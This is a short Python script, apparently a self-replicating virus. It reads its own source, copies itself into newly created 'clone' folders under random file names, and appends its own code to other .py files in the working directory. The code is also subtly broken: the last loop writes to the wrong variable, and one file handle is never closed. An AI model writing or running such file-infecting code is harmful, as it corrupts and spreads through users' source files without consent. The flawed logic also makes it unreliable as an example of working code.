import os, random, re

file = open(__file__, 'r')
data = file.read()
file.close()

def Randomize():
    name = ''
    chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    length = random.randint(1, 11)
    for i in range(length):
        name += random.choice(chars)
    return name

def Multiply(name, folder):
    try:
        os.mkdir(folder)
        os.chdir(folder)
        file = open(name, 'w')
        file.write(data)
        os.chdir('..')
    except Exception as e:
        folder = folder + '0'
        Multiply(name, folder)


# This will say how many times to replicate.
for i in range(1):
    name = Randomize()
    Multiply(name, 'clone')

files = list()
for file in os.listdir():
    if file.endswith('.py'):
        files.append(file)
files.remove(__file__)

for f in files:
    Object = open(file, 'a')
    Object.write(data)
    Object.close()